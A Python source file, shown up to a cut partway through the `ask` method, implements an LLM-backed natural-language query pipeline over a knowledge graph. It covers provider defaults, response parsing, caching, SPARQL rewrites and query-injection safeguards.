from infona_client.graph.iri import ENTITY_URI_PREFIX, IRI_BASE, TYPE_URI_PREFIX
import json
import os
import re
import time
from typing import Any, Iterable

import anthropic
import httpx
import structlog

from infona_client.graph.client import NeptuneClient
from infona_client.graph.parser import parse_sparql_results, unbound_projection_vars
from infona_client.graph.queries import parse_kg_graph_uri, skip_invalid_type_name
from infona_client.graph.sparql_scope import (
    CrossTenantQueryError,
    confine_generated_query,
    tenant_of_graph,
)
from infona_client.models.query import NLResult
from infona_client.nlp.cypher_generate import (
    neo4j_ask_enabled,
    ontology_from_graph_store,
    records_to_bindings,
)

_TEMPLATE_PARAM_RE = re.compile(r"\$([A-Za-z_][A-Za-z0-9_]*)")


def _missing_template_params(cypher_text: str, params: dict) -> set[str]:
    """Return allowlisted template ``$name`` tokens not present in params.

    Session-injected scope keys are never "missing". Optional nullables like
    ``after_id`` / ``rel_attr`` / ``to_types`` may be explicitly ``None``.
    """
    needed = set(_TEMPLATE_PARAM_RE.findall(cypher_text or ""))
    needed.discard("tenant_id")
    needed.discard("kg")
    missing: set[str] = set()
    for name in needed:
        if name not in params:
            missing.add(name)
    return missing
from infona_client.nlp.cypher_scope import (
    CrossTenantCypherError,
    CypherScopeError,
    confine_generated_cypher,
    scrub_cypher_error,
)
from infona_client.nlp.prompts import (
    CYPHER_GENERATION_SYSTEM,
    SPARQL_GENERATION_SYSTEM,
    build_cypher_generation_prompt,
    build_generation_prompt,
)
from infona_client.nlp.validator import normalize_sparql, validate_sparql
from infona_client.nlp.token_usage import (
    STAGE_REPHRASE,
    TokenUsageLedger,
    attach_usage,
    pop_attached_usage,
    stage_for_attempt,
)
from infona_client.pipeline.manifest import RunCoverage, RunManifest
from infona_client.offline import assert_online_url
from infona_client.resolver.llm_router import model_chain
from infona_client.spatiotemporal.routing import (
    SPATIAL_INTENT_SCHEMA,
    SPATIAL_INTENT_SYSTEM,
    filter_by_type,
    format_spatial_answer,
    looks_spatial,
    parse_spatial_intent,
)

logger = structlog.stdlib.get_logger("infona.nlp.pipeline")


class SparqlAskPathRetired(RuntimeError):
    """Raised when ``NLQueryPipeline.ask(..., use_cypher=False)`` is requested.

    The Neptune SPARQL NL path was removed with the cutover (ONTA-534). Product
    ``/ask`` always takes Cypher via :meth:`_ask_cypher`. The exception exists so
    eval/archive callers that still pass ``use_cypher=False`` fail closed with a
    clear message instead of POSTing SPARQL at a decommissioned endpoint.
    """


# In-memory ontology cache: {graph_uri: (summary_str, timestamp)}
_ontology_cache: dict[str, tuple[str, float]] = {}
ONTOLOGY_CACHE_TTL = 60  # seconds

# Active-type cache: {cache key: (type names with instances, timestamp)}.
# The probe is one cheap DISTINCT query, but ONTA-411 puts it on the HOT
# semantic-retrieval path (every /ask, not just a full-ontology fetch), so it
# gets the same TTL as the ontology summary it scopes.
_active_types_cache: dict[str, tuple[set[str], float]] = {}


def _store_active_types(key: str, names: set[str]) -> None:
    """Write one active-type answer, dropping entries that have already expired.

    The TTL only ever gated SERVING; nothing ever deleted. That was survivable
    while the key was one entry per KG, but the key now carries a second
    dimension (the candidate set), so a workspace whose declared types churn
    would accumulate an entry per distinct set forever. `invalidate_cache`
    reclaims on every converged write and covers most churn; this covers the
    rest, e.g. an embedding-store reload or a partial rebuild with no write
    behind it.
    """
    now = time.time()
    for k in [
        k for k, v in _active_types_cache.items()
        if (now - v[1]) >= ONTOLOGY_CACHE_TTL
    ]:
        _active_types_cache.pop(k, None)
    _active_types_cache[key] = (names, now)


def _active_types_cache_key(instance_graph: str, declared_names=None) -> str:
    """Cache key for one active-type answer: instance graph + CANDIDATE SET.

    The bounded probe (ONTA-427) answers "which of THESE candidates carry
    instances", so its result is only meaningful for the candidate set it was
    asked about. The two callers derive candidates differently: the semantic path
    from the embedding store's type names, the full path from the schema read.
    Those sets are normally identical, and the shared key then makes them share
    one probe. When they diverge (a type declared but not yet embedded, or
    embedded then removed) a single key would let one caller serve the other an
    answer that never asked about the missing type, marking a POPULATED type
    "[no instances]", which is the exact ONTA-258 regression ONTA-427 took care
    to avoid. Keying on the candidate set makes that unrepresentable rather than
    unlikely.

    Starts with the instance graph URI so `invalidate_cache`'s prefix sweep still
    drops every entry for a tenant.
    """
    if not declared_names:
        return f"{instance_graph}|scan"
    import hashlib

    digest = hashlib.sha1(
        "\u0000".join(sorted(declared_names)).encode()
    ).hexdigest()[:16]
    return f"{instance_graph}|{digest}"

# Distinct markers so a TRANSIENT fetch failure is never mistaken for a genuinely
# empty graph (ONTA-248 A2: "errors masquerade as facts"). The old error text
# ("Graph may be empty.") let the LLM authoritatively state the graph was empty on
# a mere throttle/timeout. These strings are surfaced to the SPARQL-generation LLM;
# the error marker explicitly forbids asserting absence.
ONTOLOGY_FETCH_ERROR = (
    "Could not fetch the ontology for this graph (a transient backend error, e.g. "
    "a timeout or throttle). This does NOT mean the graph is empty or that any "
    "type is absent — the schema is simply UNKNOWN right now. Do not claim any "
    "type or attribute does not exist; suggest retrying."
)
ONTOLOGY_EMPTY = "No ontology defined yet."

# Cap on concurrent enum-discovery SPARQL queries (COG-58). Enum discovery
# fires one COUNT(DISTINCT) per attribute + per relationship; an unbounded
# asyncio.gather meant a wide table (hundreds of columns → hundreds of
# attributes) launched O(columns) simultaneous queries, throttling serverless
# Neptune (1–2.5 NCU). The semaphore keeps the round-trip count bounded
# regardless of column count, trading a little latency for stability.
MAX_ENUM_DISCOVERY_CONCURRENCY = int(
    os.environ.get("INFONA_ENUM_DISCOVERY_CONCURRENCY", "8")
)

# Active-type probe bounds (ONTA-427). The probe answers "which DECLARED types
# actually carry instances in this KG?", the signal behind the "[no instances]"
# annotation (ONTA-258). It used to be one UNBOUNDED `SELECT DISTINCT ?type`
# scan of the whole instance graph per ontology fetch; it is now one LIMIT-1
# index probe per candidate type URI, which costs O(declared types) instead of
# O(entities in the KG).
#
# Past MAX_ACTIVE_TYPE_PROBE_URIS candidates the bounded form stops paying off:
# several hundred index seeks plus a query tens of KB long is no longer cheaper
# than one sequential scan, so we deliberately fall back to the scan there. That
# is the pre-ONTA-427 behavior, which is correct, just expensive.
MAX_ACTIVE_TYPE_PROBE_URIS = int(
    os.environ.get("INFONA_ACTIVE_TYPE_PROBE_MAX", "600")
)
# Candidate URIs per probe query, keeping one query's text around 10 to 15 KB
# (roughly 180 bytes per existence subselect) instead of one ~100 KB query.
# Chunks run concurrently, bounded by MAX_ACTIVE_TYPE_PROBE_CONCURRENCY.
ACTIVE_TYPE_PROBE_CHUNK = int(
    os.environ.get("INFONA_ACTIVE_TYPE_PROBE_CHUNK", "60")
)
# Simultaneous probe queries. Mirrors the enum-discovery cap (COG-58) so the
# probe can never exceed the concurrency this same fetch deliberately caps
# elsewhere against serverless Neptune.
MAX_ACTIVE_TYPE_PROBE_CONCURRENCY = int(
    os.environ.get(
        "INFONA_ACTIVE_TYPE_PROBE_CONCURRENCY", str(MAX_ENUM_DISCOVERY_CONCURRENCY)
    )
)

RDF_TYPE_URI = "http://www.w3.org/1999/02/22-rdf-syntax-ns#type"

# Attribute-alias map cache (ADR 0002 §7): {graph_uri: (old->new map, timestamp)}
_alias_cache: dict[str, tuple[dict[str, str], float]] = {}

# Query generation provider config.
# INFONA_LLM_BASE_URL / INFONA_QUERY_BASE_URL let self-hosted OpenAI-compatible
# endpoints (vLLM, Ollama, LiteLLM) serve /ask without a source patch
# (OSS dogfood S8). Fall back to the public OpenRouter host.
def _openrouter_base() -> str:
    return (
        os.environ.get("INFONA_QUERY_BASE_URL")
        or os.environ.get("INFONA_LLM_BASE_URL")
        or os.environ.get("INFONA_OPENROUTER_BASE_URL")
        or "https://openrouter.ai/api/v1"
    ).rstrip("/")


OPENROUTER_BASE = _openrouter_base()


def _default_query_provider() -> str:
    """Prefer explicit env; otherwise pick a provider the process can actually call.

    Historical default was ``cerebras`` + ``llama3.1-8b``. That silently fails
    for the common OSS quickstart that only sets ``OPENROUTER_API_KEY`` —
    /ask returned HTTP 200 with the provider 400 text as the answer
    (OSS dogfood S1/S2/S4/S5). When Cerebras is not configured but OpenRouter
    is, default to OpenRouter.
    """
    explicit = os.environ.get("INFONA_QUERY_PROVIDER")
    if explicit:
        return explicit.strip().lower()
    has_openrouter = bool(
        os.environ.get("OPENROUTER_API_KEY")
        or os.environ.get("INFONA_OPENROUTER_API_KEY")
    )
    has_cerebras = bool(
        os.environ.get("CEREBRAS_API_KEY")
        or os.environ.get("INFONA_CEREBRAS_API_KEY")
    )
    if has_openrouter and not has_cerebras:
        return "openrouter"
    return "cerebras"


def _default_query_model(provider: str | None = None) -> str:
    """Default NL→Cypher model.

    OpenRouter OSS default is OpenAI **gpt-oss-120b** (reasoning / thinking
    model; often served via Cerebras on OpenRouter). Override with
    ``INFONA_QUERY_MODEL``. Direct Cerebras provider uses the bare slug.
    """
    explicit = os.environ.get("INFONA_QUERY_MODEL")
    if explicit:
        return explicit
    prov = (provider or _default_query_provider()).lower()
    if prov == "openrouter":
        return "openai/gpt-oss-120b"
    if prov == "cerebras":
        return "gpt-oss-120b"
    return "gpt-oss-120b"


def _is_reasoning_query_model(model: str | None) -> bool:
    """True for models that spend tokens on chain-of-thought before JSON."""
    m = (model or "").lower()
    if not m:
        return False
    return any(
        tok in m
        for tok in (
            "gpt-oss",
            "o1",
            "o3",
            "o4",
            "reasoning",
            "thinking",
            "deepseek-r1",
            "r1-",
        )
    )


DEFAULT_QUERY_MODEL = _default_query_model()
DEFAULT_QUERY_PROVIDER = _default_query_provider()  # cerebras, openrouter, or anthropic

# Reasoning-budget recovery for gpt-oss-120b (and similar). The model can spend
# its ENTIRE max_completion_tokens on reasoning and return finish_reason=length
# with NO answer content. Retry with a bigger budget; then optionally fall back
# to a non-reasoning path.
CEREBRAS_LENGTH_RECOVERY_TOKENS = int(
    os.environ.get("INFONA_QUERY_LENGTH_RECOVERY_TOKENS", "6144")
)
# OpenRouter reasoning models need headroom for think + JSON Cypher answer.
OPENROUTER_REASONING_MAX_TOKENS = int(
    os.environ.get("INFONA_QUERY_OPENROUTER_MAX_TOKENS", "8192")
)
OPENROUTER_QUERY_TIMEOUT_S = float(
    os.environ.get("INFONA_QUERY_OPENROUTER_TIMEOUT_S", "120")
)


class EmptyLLMResponse(ValueError):
    """Raised when an OpenAI-compatible chat completion carried no usable
    ``content`` — the key is missing entirely, ``null``, or an empty string.

    Subclasses ``ValueError`` (and keeps the exact ``"empty LLM response from
    <provider>"`` message) so every existing ``except ValueError`` /
    ``except Exception`` retry-and-fallback path — and the existing guard tests —
    treat it identically to the old bare ``ValueError``. It additionally carries
    ``finish_reason`` so a caller can distinguish a *reasoning-budget exhaustion*
    (``finish_reason == "length"``: the model spent its whole
    ``max_completion_tokens`` on reasoning and never emitted the answer) — which
    is RECOVERABLE with a bigger budget or a non-reasoning fallback — from an
    ordinary empty/null response.
    """

    def __init__(self, provider: str, finish_reason: str | None = None):
        self.provider = provider
        self.finish_reason = finish_reason
        super().__init__(f"empty LLM response from {provider}")


def _require_message_content(data: dict, provider: str) -> str:
    """Extract ``choices[0].message.content`` from an OpenAI-compatible chat
    completion, raising a clear, typed error when the model returns an
    empty/``None``/ABSENT content.

    Some models intermittently return ``content: null`` (e.g. GLM-5.2 did this
    ~40x in production) or an empty string; a *reasoning* model that exhausts its
    ``max_completion_tokens`` on reasoning (``finish_reason == "length"``) can
    omit the ``content`` key ENTIRELY (Cerebras gpt-oss-120b did this ~11x in
    persona-eval). Callers immediately ``.strip()`` or ``json.loads()`` the
    content, so a null surfaces as an opaque ``AttributeError`` / ``TypeError``,
    and a *missing* key used to surface as a hard ``KeyError('content')`` that flew
    past the retry loop as ``"Could not answer … Last error: 'content'"``. This
    guard turns ALL of those — missing/absent ``choices``/``message``/``content``,
    ``null``, or ``""`` — into one diagnosable :class:`EmptyLLMResponse` (a
    ``ValueError`` subclass) that names the provider and carries the
    ``finish_reason``, so each caller's existing retry/fallback/error path handles
    it uniformly and can RECOVER a truncated reasoning turn. The happy path is
    unchanged: when ``content`` is a normal non-empty string it is returned
    verbatim.
    """
    # Degrade every shape defect (absent choices/message/content, empty list,
    # non-dict payload) to the SAME diagnosable empty-response error rather than
    # trading one raw KeyError/IndexError/TypeError for another.
    try:
        choice = data["choices"][0]
    except (KeyError, IndexError, TypeError):
        choice = {}
    if not isinstance(choice, dict):
        choice = {}
    message = choice.get("message")
    if not isinstance(message, dict):
        message = {}
    content = message.get("content")
    if not content:
        finish_reason = choice.get("finish_reason")
        raise EmptyLLMResponse(provider, finish_reason=finish_reason)
    return content


def _strip_code_fences(text: str) -> str:
    """Drop ```/```json fence lines a model sometimes wraps its JSON in.

    Mirrors the fence-stripping the OpenRouter/Anthropic SPARQL paths already do,
    so the Cerebras path tolerates the same wrapping. A fence-free response is
    returned with only surrounding whitespace stripped (happy path unchanged).
    """
    stripped = text.strip()
    if stripped.startswith("```"):
        stripped = "\n".join(
            l for l in stripped.split("\n") if not l.strip().startswith("```")
        )
    return stripped


def _salvage_sparql_field(text: str) -> str:
    """Best-effort extraction of the ``sparql`` string from a MALFORMED JSON blob.

    A reasoning model occasionally truncates its JSON mid-string (an unterminated
    ``"sparql": "SELECT …`` with no closing quote/brace) or otherwise emits JSON
    that ``json.loads`` rejects. Rather than throw the whole (possibly usable)
    query away, walk the characters after ``"sparql":`` honoring JSON escapes and
    stop at the first UNescaped closing quote — or at end-of-string when the model
    was cut off. Returns the recovered query text, or ``""`` when there is no
    ``sparql`` field to recover (which degrades to the empty-query escalation).
    """
    m = re.search(r'"sparql"\s*:\s*"', text)
    if not m:
        return ""
    i, n = m.end(), len(text)
    out: list[str] = []
    escapes = {"n": "\n", "t": "\t", "r": "\r", '"': '"', "\\": "\\", "/": "/"}
    while i < n:
        c = text[i]
        if c == "\\" and i + 1 < n:
            out.append(escapes.get(text[i + 1], text[i + 1]))
            i += 2
            continue
        if c == '"':
            break  # unescaped closing quote — end of the value
        out.append(c)
        i += 1
    return "".join(out).strip()


def _parse_sparql_gen_json(content: str) -> dict:
    """Tolerantly parse a SPARQL-generation JSON response.

    Well-formed JSON (the happy path) parses byte-identically to
    ``json.loads(content)`` — code fences, if any, are stripped first exactly as
    the OpenRouter path already does. On a JSON parse error (code-fence residue,
    an unterminated/truncated string, trailing prose) it SALVAGES the ``sparql``
    field so a truncated-but-usable query still runs; when nothing can be
    recovered it returns an EMPTY ``sparql`` so the caller's retry loop escalates
    (full ontology + explicit "produce a valid non-empty SELECT" feedback) instead
    of surfacing an uncaught ``JSONDecodeError``.
    """
    stripped = _strip_code_fences(content)
    try:
        return json.loads(stripped)
    except (json.JSONDecodeError, ValueError):
        return {
            "sparql": _salvage_sparql_field(stripped),
            "explanation": "",
            "functions_needed": [],
        }


# Max rows rendered in the plain-text answer before truncating. The old
# hard-coded 20 silently dropped most of a wide "list all ..." result; raise it
# and make it tunable. Truncation is now stated prominently (not buried) AND
# the slice is deterministic because generated SELECTs get a stable ORDER BY.
ANSWER_ROW_CAP = int(os.environ.get("INFONA_ANSWER_ROW_CAP", "100"))

# Embedding service singleton
_embedding_service = None


def _resolve_openrouter_api_key() -> str:
    """OpenRouter key for embeddings / LLM helpers.

    Settings uses ``INFONA_`` prefix (``INFONA_OPENROUTER_API_KEY``). OSS
    quickstart docs often set bare ``OPENROUTER_API_KEY`` — accept both so
    auto ontology embed turns on without a second env rename.
    """
    import os

    from infona_client.config import settings

    return (
        (getattr(settings, "openrouter_api_key", None) or "").strip()
        or (os.environ.get("INFONA_OPENROUTER_API_KEY") or "").strip()
        or (os.environ.get("OPENROUTER_API_KEY") or "").strip()
    )


def get_embedding_service():
    """Lazy-init singleton for the ontology embedding service.

    Returns ``None`` only when no OpenRouter key is configured (cannot embed).
    """
    global _embedding_service
    if _embedding_service is None:
        from infona_client.config import settings

        key = _resolve_openrouter_api_key()
        if key:
            from infona_client.nlp.ontology_embeddings import OntologyEmbeddingService

            _embedding_service = OntologyEmbeddingService(
                openrouter_api_key=key,
                s3_bucket=settings.embeddings_s3_bucket,
                s3_prefix=settings.embeddings_s3_prefix,
            )
    return _embedding_service


def reset_embedding_service_for_tests() -> None:
    """Drop the process singleton (tests only)."""
    global _embedding_service
    _embedding_service = None


# Spatial fast-path helpers (ONTA-157 Phase 2). Module-level + pure so they're
# trivially testable; the orchestration that uses them lives on NLQueryPipeline.
_GEO_WKT_URI = "http://www.opengis.net/ont/geosparql#wktLiteral"
_POINT_RE = re.compile(
    r"POINT\s*\(\s*(-?\d+(?:\.\d+)?)\s+(-?\d+(?:\.\d+)?)\s*\)", re.IGNORECASE
)


def _parse_iso_dt(s):
    """ISO-8601 string → tz-aware (UTC-assumed) datetime, or None. Mirrors the
    extractor so a query bound and an indexed validity compare without raising."""
    if not s or not isinstance(s, str):
        return None
    from datetime import datetime, timezone

    t = s.strip()
    if t.endswith("Z"):
        t = t[:-1] + "+00:00"
    try:
        dt = datetime.fromisoformat(t)
    except ValueError:
        return None
    return dt if dt.tzinfo else dt.replace(tzinfo=timezone.utc)


def _parse_point_wkt(wkt: str):
    """``"POINT(lon lat)"`` → (lon, lat) in WGS84 range, else None."""
    if not isinstance(wkt, str):
        return None
    m = _POINT_RE.search(wkt)
    if not m:
        return None
    try:
        lon, lat = float(m.group(1)), float(m.group(2))
    except ValueError:
        return None
    if not (-180.0 <= lon <= 180.0 and -90.0 <= lat <= 90.0):
        return None
    return lon, lat



def _cypher_uses_forbidden_shapes(cypher: str) -> str | None:
    """Return a short reason if free-form Cypher uses non-existent graph shapes.

    The LLM sometimes invents ``HAS_ASSERTION`` / ``predicate_key`` despite the
    system prompt; that path returns silent zeros for SUM/AVG. Detect before
    execute so we can retry with corrective feedback.
    """
    c = cypher or ""
    if re.search(r"(?i)\bHAS_ASSERTION\b", c):
        return "uses forbidden HAS_ASSERTION (does not exist; use Assertion-[:PREDICATE]->Property and a.literal_value or e[prop])"
    if re.search(r"(?i)\bpredicate_key\b", c):
        return "uses forbidden predicate_key (Property.name is the leaf key)"
    if re.search(r"(?i)Assertion\.prop_key", c):
        return "uses forbidden Assertion.prop_key"
    return None


def _sanitize_sparql_literal(text: str) -> str:
    """Strip characters that could break out of a SPARQL string literal, and cap
    length — the anchor description comes from the LLM and is interpolated into a
    FILTER(CONTAINS(...)) literal."""
    return re.sub(r'["\\\n\r\t]', " ", text).strip().lower()[:80]


# Neptune does not implement `xsd:dayTimeDuration` (nor `xsd:yearMonthDuration`)
# arithmetic on `xsd:dateTime`: `NOW() - "P7D"^^xsd:dayTimeDuration` evaluates to an
# ERROR/unbound (not a dateTime), so a recency FILTER against it silently drops every
# row — and in aggregate/property-path query shapes escalates to a hard 400/500. The
# equivalent `xsd:duration` subtraction DOES evaluate on Neptune (verified on the
# deployed cluster) and is also accepted by spec engines like pyoxigraph, so it is the
# common-denominator datatype for a "last N days" window. This rewrites the datatype IRI
# of a duration literal (bare `xsd:` prefix or the full XMLSchema# IRI, in angle brackets
# or not) to `duration`. Idempotent — a literal already typed `duration` is untouched.
_DURATION_DATATYPE_RE = re.compile(
    r"(\^\^)"                                                    # the datatype marker
    r"(<?)"                                                      # optional opening angle bracket
    r"(xsd:|http://www\.w3\.org/2001/XMLSchema#)"                # bare prefix OR full namespace
    r"(?:dayTimeDuration|yearMonthDuration)"                     # the Neptune-unsupported subtypes
    r"(>?)",                                                     # optional closing angle bracket
    re.IGNORECASE,
)


def _neptune_safe_duration(sparql: str) -> str:
    """Rewrite `xsd:dayTimeDuration`/`xsd:yearMonthDuration` duration literals to
    `xsd:duration` so a NOW()-relative recency FILTER is valid on Neptune.

    Preserves the exact surface form the LLM emitted (bare `xsd:` prefix vs full
    XMLSchema# IRI, and whether it was wrapped in angle brackets), rewriting only the
    local name. Idempotent and safe on any query — it matches only a duration-subtype
    datatype IRI, which appears nowhere else.
    """
    def _sub(m: re.Match) -> str:
        marker, open_b, namespace, close_b = m.groups()
        # `namespace` is exactly the prefix/IRI the LLM used (`xsd:` or the full
        # XMLSchema# IRI); reuse it verbatim so only the local name changes.
        return f"{marker}{open_b}{namespace}duration{close_b}"

    return _DURATION_DATATYPE_RE.sub(_sub, sparql)


_RDFS_LABEL_IRI = "http://www.w3.org/2000/01/rdf-schema#label"


def _prefer_attr_name_over_rdfs_label(sparql: str, ontology_summary: str = "") -> str:
    """Rewrite ``rdfs:label`` → ``types/<T>/attrs/name`` only when clearly safe.

    Gates (all required):
    1. Query uses ``rdfs:label``.
    2. Exactly one pure type IRI ``…/types/<T>`` (not multi-type joins).
    3. Exactly one subject variable typed as that ``T``.
    4. Ontology summary *exactly* declares ``types/<T>/attrs/name``
       (``URI: <…/attrs/name>`` / ``<…/attrs/name>`` — not a ``name*`` prefix).
    5. Query does not already use that ``attrs/name`` URI.
    6. The ``rdfs:label`` triple being rewritten is on that same typed subject
       (never on a related untyped var such as a venue reached via ``onto/``).

    Fail-closed when ``ontology_summary`` is empty. Path-B/CSV KGs often put
    human names on ``attrs/name`` and slugs on ``rdfs:label``; rank answers then
    show ``name: 5``. Without the gates we would blank legitimate labels.
    """
    if _RDFS_LABEL_IRI not in sparql and "rdfs:label" not in sparql.lower():
        return sparql
    # Pure type IRIs only: <…/types/Person> — attrs paths end with /attrs/… so
    # the trailing `>` after the leaf name does not match them.
    leaves = list(
        dict.fromkeys(
            re.findall(
                rf"<{re.escape(IRI_BASE)}/types/([A-Za-z][A-Za-z0-9_]*)>",
                sparql,
            )
        )
    )
    if len(leaves) != 1:
        return sparql
    t = leaves[0]
    name_uri = f"{IRI_BASE}/types/{t}/attrs/name"
    if name_uri in sparql:
        return sparql
    # Fail-closed: no summary → no rewrite. Exact declaration only (trailing
    # `>` so attrs/namespace / attrs/name_slug do not false-positive).
    if not ontology_summary:
        return sparql
    if (
        f"URI: <{name_uri}>" not in ontology_summary
        and f"<{name_uri}>" not in ontology_summary
    ):
        return sparql

    type_iri = f"{IRI_BASE}/types/{t}"
    # Accept bare type predicates and the subclass-closure path Fix 4 injects
    # (`<#type>/<#subClassOf>*`) so this rewrite still fires on the real /ask
    # post-process chain (Fix 7 runs after Fix 4).
    _rdf_type = "http://www.w3.org/1999/02/22-rdf-syntax-ns#type"
    _rdfs_sc = "http://www.w3.org/2000/01/rdf-schema#subClassOf"
    typed_subj = re.compile(
        rf"\?([A-Za-z_][A-Za-z0-9_]*)\s+(?:"
        rf"a|"
        rf"rdf:type|"
        rf"<{re.escape(_rdf_type)}>"
        rf"(?:\s*/\s*<{re.escape(_rdfs_sc)}>\*)?"
        rf")\s+<{re.escape(type_iri)}>",
        re.I,
    )
    subjects = list(dict.fromkeys(m.group(1) for m in typed_subj.finditer(sparql)))
    if len(subjects) != 1:
        return sparql
    subj = subjects[0]

    # Subject-bound: only rewrite label on the typed variable, first match.
    full_label = re.compile(
        rf"(\?{re.escape(subj)}\s+)<{re.escape(_RDFS_LABEL_IRI)}>(\s+)"
    )
    if full_label.search(sparql):
        return full_label.sub(rf"\1<{name_uri}>\2", sparql, count=1)
    pref_label = re.compile(
        rf"(\?{re.escape(subj)}\s+)rdfs:label(\s+)",
        re.I,
    )
    if pref_label.search(sparql):
        return pref_label.sub(rf"\1<{name_uri}>\2", sparql, count=1)
    return sparql


_ENTITY_URI_PREFIX = ENTITY_URI_PREFIX


#: Codepoints the SPARQL 1.1 IRIREF production forbids INSIDE ``<…>``:
#: ``'<' ([^<>"{}|^`\] - [#x00-#x20])* '>'``. A value containing any of them
#: cannot be interpolated into an IRI without changing the query's syntax.
_IRIREF_FORBIDDEN = frozenset('<>"{}|^`\\')


def _is_interpolatable_iri(value: str) -> bool:
    """True when ``value`` can be written as ``<value>`` and stay one IRI token.

    The check is the IRIREF grammar's own exclusion set rather than a blocklist
    of the characters one particular payload happened to use: ``>`` terminates
    the IRI, and every other excluded codepoint is excluded precisely because it
    could change how the rest of the query tokenises.
    """
    return bool(value) and not any(
        c in _IRIREF_FORBIDDEN or ord(c) <= 0x20 for c in value
    )


def _row_has_entity_object(row: dict) -> bool:
    """True if any value in the row is an entity IRI (``…/entities/…``).

    A describe-shape row (``?p ?o``) whose object is an entity IRI means ``?p`` is
    a RELATIONSHIP edge, not a literal-valued housekeeping marker — so the
    predicate filter must apply its ``is_relationship`` exemption for that row and
    NOT hide a real relationship that happens to share a housekeeping leaf name.
    """
    return any(
        isinstance(v, str) and v.startswith(_ENTITY_URI_PREFIX) for v in row.values()
    )


def _drop_internal_predicate_rows(bindings: list[dict]) -> list[dict]:
    """Drop result rows that describe an INTERNAL/housekeeping predicate.

    The NL ``ask`` path renders every binding verbatim, so a ``SELECT ?p ?o``
    "describe this entity" or a ``SELECT DISTINCT ?p`` query leaks entity-
    resolution internals (``er/blockKey``, ``er/erSignal_*``), ingest housekeeping
    (``onto/batch_id``, …) and normalization bookkeeping (``onto/norm/*``) straight
    into the answer text. This is the render-time twin of the Explorer's panel
    filter: a row is dropped when ANY of its values is an internal predicate URI
    per the shared :func:`is_internal_predicate`.

    Real relationships on ``…/onto/<leaf>`` are PRESERVED (the shared helper
    returns False for them). When a row's object is an entity IRI the predicate is
    treated as a relationship (``is_relationship=True``) so a legitimate edge that
    shares a housekeeping leaf name (e.g. an ``…/onto/source`` edge pointing at an
    Organization) is not hidden. Rows carrying no predicate-shaped value (ordinary
    attribute projections like ``?name ?latency``) are untouched — nothing in them
    matches an internal predicate URI, so they always pass through.
    """
    from infona_client.graph.predicates import is_internal_predicate

    def _is_uri(v) -> bool:
        return isinstance(v, str) and v.startswith(("http://", "https://"))

    kept: list[dict] = []
    for row in bindings:
        is_rel = _row_has_entity_object(row)
        # Only URI-shaped values can be a predicate; a literal / empty attribute
        # value must never trigger the drop (is_internal_predicate("") is True).
        if any(
            _is_uri(v) and is_internal_predicate(v, is_relationship=is_rel)
            for v in row.values()
        ):
            continue
        kept.append(row)
    return kept


class NLQueryPipeline:
    def __init__(
        self,
        neptune: NeptuneClient,
        anthropic_key: str,
        *,
        graph_store: "object | None" = None,
    ):
        self.neptune = neptune
        self.anthropic = anthropic.AsyncAnthropic(api_key=anthropic_key)
        # Optional GraphStore for the Neo4j /ask path (E6). When None, the
        # Cypher path uses :func:`get_graph_store` under INFONA_GRAPH_BACKEND=neo4j.
        self._graph_store = graph_store
        from infona_client.config import settings
        self._openrouter_key = settings.openrouter_api_key or os.environ.get("OPENROUTER_API_KEY", "")
        self._cerebras_key = os.environ.get("CEREBRAS_API_KEY", getattr(settings, "cerebras_api_key", ""))
        # Re-resolve at construct time so env set after import (tests, uvicorn
        # workers that load .env late) still get the smart OpenRouter default.
        self._query_provider = _default_query_provider()
        self._query_model = _default_query_model(self._query_provider)
        # Refresh base URL live so INFONA_LLM_BASE_URL is honored without reimport.
        global OPENROUTER_BASE
        OPENROUTER_BASE = _openrouter_base()
        # Attribute aliases (ADR 0002 §7): resolve renamed attribute IRIs in
        # generated SPARQL. Default OFF so the default Neptune call pattern
        # stays byte-identical (same gating pattern as INFONA_ER_ENABLED).
        self._aliases_enabled = os.environ.get("INFONA_ALIASES_ENABLED", "0") == "1"
        # Spatio-temporal read routing (ONTA-157 Phase 2 → ONTA-249): a
        # geo/proximity question is answered directly from the secondary index (no
        # Neptune round-trip). Now a SUPPORTED path and ENABLED BY DEFAULT (ONTA-249):
        # the radius/bbox engine is fully built and, with the free-text geocoder
        # seam, a bare place-name anchor resolves — so "within N km of PLACE" works
        # end-to-end. It is defensively gated: the fast path returns None (falls
        # through to SPARQL unchanged) whenever the question isn't spatial, the KG
        # can't be scoped, the intent doesn't parse, or the anchor can't be
        # resolved — so enabling it cannot regress a non-spatial query. Set
        # INFONA_SPATIAL_ROUTING_ENABLED=0 to force it off (e.g. byte-stable evals).
        self._spatial_routing_enabled = (
            os.environ.get("INFONA_SPATIAL_ROUTING_ENABLED", "1") != "0"
        )
        # Honest-answer per-fact metadata (ONTA-280, P7): attach per-cited-fact
        # verdict/confidence/recency + a coverage caveat to a successful answer.
        # Default OFF so the default answer path stays byte-identical (same gating
        # pattern as the alias/spatial features above) — a byte-stable eval is
        # unaffected. Purely additive, read-only, post-execution.
        self._answer_citations_enabled = (
            os.environ.get("INFONA_ANSWER_CITATIONS_ENABLED", "0") == "1"
        )

    async def ask(
        self,
        question: str,
        graph_uri: str,
        instance_graph: str | None = None,
        exclude_questions: list[str] | None = None,
        layer_graph_uris: list[str] | None = None,
        run_manifest: "RunManifest | RunCoverage | None" = None,
        *,
        use_cypher: bool | None = None,
    ) -> NLResult:
        """Answer a natural-language question over the graph.

        layer_graph_uris (ADR 0002 §1, COG-37, opt-in): a LayerStack's
        visible_graph_uris(). Generated queries are graph-scoped (FROM the
        data graph), so without this the subclass-closure path can't see
        subClassOf edges living in other layer graphs; when provided, each
        generated query gains FROM clauses for every visible layer. When
        None (the default), behavior is exactly as before.

        run_manifest (A9, ONTA-374, opt-in): the run's :class:`RunManifest`
        (or its already-computed :class:`RunCoverage`). When threaded, the
        answer's coverage caveat composes the REAL A9 "answered from N of M
        items" fragment (the A9→A7 honest-answers contract) instead of the
        stale-count-only caveat. When None (the default — no caller threads one
        today), the answer + caveat are byte-identical to the prior behavior.

        use_cypher (ONTA-534): Cypher is the only product NL path. Default /
        ``True`` runs :meth:`_ask_cypher` via GraphStore. Explicit
        ``use_cypher=False`` raises :class:`SparqlAskPathRetired` — the Neptune
        SPARQL generator is no longer reachable from ``ask`` (ONTA-534).
        """
        # Ontology is always fetched from the base tenant graph for embeddings;
        # when layer_graph_uris is set (production ask route, ONTA-397) the full
        # fetch also unions visible global layers with shadowing so Public types
        # are visible to the planner. Instance data may be in a different graph.
        data_graph = instance_graph or graph_uri

        # ONTA-534: Cypher is the only NL path. ``use_cypher=False`` used to
        # force the Neptune SPARQL generator for eval/archive harnesses; that
        # store is gone, so the SPARQL branch is retired fail-closed rather
